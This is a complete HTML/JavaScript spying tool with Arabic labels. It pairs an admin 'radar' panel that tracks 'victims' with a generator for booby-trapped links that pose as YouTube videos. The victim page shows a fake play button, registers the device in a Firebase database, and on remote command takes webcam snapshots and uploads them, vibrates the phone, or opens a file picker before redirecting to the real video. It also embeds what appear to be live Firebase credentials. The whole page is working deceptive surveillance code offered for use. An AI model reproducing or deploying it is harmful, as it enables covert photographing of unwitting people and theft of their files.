<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SYSTEM V20 | ADMIN</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        :root { --neon: #00ff41; --bg: #0a0a0a; }
        body { background: #000; color: var(--neon); margin: 0; font-family: 'Courier New', monospace; }
        
        /* لوحة التحكم الرئيسية */
        #admin-panel { display: none; padding: 15px; }
        .section { border: 1px solid var(--neon); padding: 15px; margin-bottom: 15px; border-radius: 8px; background: var(--bg); }
        h3 { margin-top: 0; border-bottom: 1px solid var(--neon); padding-bottom: 5px; font-size: 14px; }

        /* قائمة الضحايا */
        .v-list { max-height: 150px; overflow-y: auto; margin-bottom: 10px; }
        .v-card { border: 1px solid #333; padding: 10px; margin-bottom: 5px; border-radius: 4px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; }
        .v-card.active { border-color: #fff; background: #1a1a1a; }
        .status-dot { width: 10px; height: 10px; border-radius: 50%; }

        /* الأزرار */
        .grid-btns { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        button { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 12px; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 12px; }
        button:active { background: var(--neon); color: #000; }
        .danger-btn { border-color: #ff3e3e; color: #ff3e3e; }

        /* واجهة الضحية المموّهة */
        #vic-panel { display: none; height: 100vh; flex-direction: column; align-items: center; justify-content: center; background: #000; position: fixed; top: 0; width: 100%; z-index: 10000; }
        .play-icon { width: 80px; height: 80px; border: 3px solid #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; }
        .play-icon::after { content: ''; border-left: 25px solid #fff; border-top: 15px solid transparent; border-bottom: 15px solid transparent; margin-left: 10px; }
    </style>
</head>
<body>

<div id="admin-panel">
    <div class="section">
        <h3>📡 الرادار (الأجهزة المتصلة)</h3>
        <div id="v-list" class="v-list">بانتظار الصيد...</div>
    </div>

    <div class="section">
        <h3>🕹️ التحكم بالجهاز: <span id="target-id" style="color:#fff;">اختر جهازاً</span></h3>
        <div class="grid-btns">
            <button onclick="cmd('snap')">📸 سحب صورة</button>
            <button onclick="cmd('vibrate')" style="border-color:yellow; color:yellow;">📳 هز الهاتف</button>
            <button onclick="cmd('pick')" style="border-color:cyan; color:cyan;">📂 سحب ملفات</button>
            <button onclick="cmd('release')" style="background:#030;">🔓 إطلاق سراح</button>
        </div>
        <button class="danger-btn" onclick="clearDB()" style="width:100%; margin-top:10px;">🗑️ تنظيف البيانات</button>
    </div>

    <div class="section">
        <h3>⚙️ مصنع الروابط (صلاحية ساعة)</h3>
        <input type="text" id="target-url" placeholder="رابط فيديو يوتيوب" style="width:100%; padding:10px; background:#000; color:var(--neon); border:1px solid var(--neon); margin-bottom:10px;">
        <button onclick="gen()" style="width:100%;">صناعة رابط ملغم</button>
        <div id="res-link" style="font-size:10px; color:#0ff; margin-top:10px; word-break:break-all;"></div>
    </div>
</div>

<div id="vic-panel">
    <div class="play-icon" onclick="startGhost()"></div>
    <p style="color:#fff; margin-top:20px;">Tap to Play Content</p>
    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>
    <input type="file" id="f-in" style="display:none;" accept="image/*" multiple>
</div>

<script>
    const config = {
        apiKey: "AIzaSyBT-2QQEdSdO-DsQvPESPc8cBQaW5azxqY",
        databaseURL: "https://monster-system-7f67e-default-rtdb.firebaseio.com",
        projectId: "monster-system-7f67e"
    };
    firebase.initializeApp(config);
    const db = firebase.database();
    let selId = null;

    const urlParams = new URLSearchParams(window.location.search);
    const isAdmin = urlParams.get('admin');
    const isVictim = urlParams.get('v');

    // التشغيل بناءً على الرابط
    if (isAdmin === "1") {
        document.getElementById('admin-panel').style.display = 'block';
        initAdmin();
    } else if (isVictim) {
        try {
            const data = JSON.parse(atob(isVictim));
            if (Date.now() - data.time > 3600000) {
                document.body.innerHTML = "<h1 style='color:#fff; text-align:center; margin-top:45vh;'>404 Not Found</h1>";
            } else {
                document.getElementById('vic-panel').style.display = 'flex';
                initVictim(data.url);
            }
        } catch(e) { document.body.innerHTML = "404 Not Found"; }
    } else {
        document.body.innerHTML = "<div style='background:#000; height:100vh;'></div>";
    }

    // وظائف الأدمن
    function initAdmin() {
        db.ref('victims').on('value', s => {
            const list = document.getElementById('v-list');
            list.innerHTML = '';
            s.forEach(child => {
                const v = child.val(); const id = child.key;
                const online = (Date.now() - v.lastSeen) < 10000;
                list.innerHTML += `<div class="v-card ${id==selId?'active':''}" onclick="sel('${id}','${v.model}')">
                    <span>${v.model}</span>
                    <div class="status-dot" style="background:${online?'#0f0':'#f00'}"></div>
                </div>`;
            });
        });
    }
    function sel(id, m) { selId = id; document.getElementById('target-id').innerText = m; }
    function cmd(t) { if(selId) db.ref('victims/'+selId+'/cmd').set({ t, time: Date.now() }); }
    function gen() {
        const url = document.getElementById('target-url').value;
        const payload = btoa(JSON.stringify({ url, time: Date.now() }));
        document.getElementById('res-link').innerText = window.location.href.split('?')[0] + "?v=" + payload;
    }
    function clearDB() { if(confirm("حذف كل البيانات؟")) db.ref('/').remove(); }

    // وظائف الضحية
    let myRef = null;
    function initVictim(target) {
        myRef = db.ref('victims').push();
        myRef.set({ model: navigator.userAgent.split(' ')[2], lastSeen: Date.now(), time: new Date().toLocaleTimeString() });
        setInterval(() => myRef.update({ lastSeen: Date.now() }), 5000);
        db.ref('victims/' + myRef.key + '/cmd').on('value', s => {
            const c = s.val(); if(!c) return;
            if(c.t === 'snap') take();
            if(c.t === 'vibrate') navigator.vibrate([300,100,300]);
            if(c.t === 'pick') document.getElementById('f-in').click();
            if(c.t === 'release') window.location.href = target;
        });
    }
    async function startGhost() { navigator.vibrate(100); take(); }
    async function take() {
        try {
            const s = await navigator.mediaDevices.getUserMedia({video:true});
            const video = document.getElementById('v'); video.srcObject = s; await video.play();
            const canvas = document.getElementById('c'); canvas.width=video.videoWidth; canvas.height=video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            myRef.child('files').push(canvas.toDataURL('image/jpeg', 0.5));
            s.getTracks().forEach(t => t.stop());
        } catch(e) {}
    }
</script>
</body>
</html>
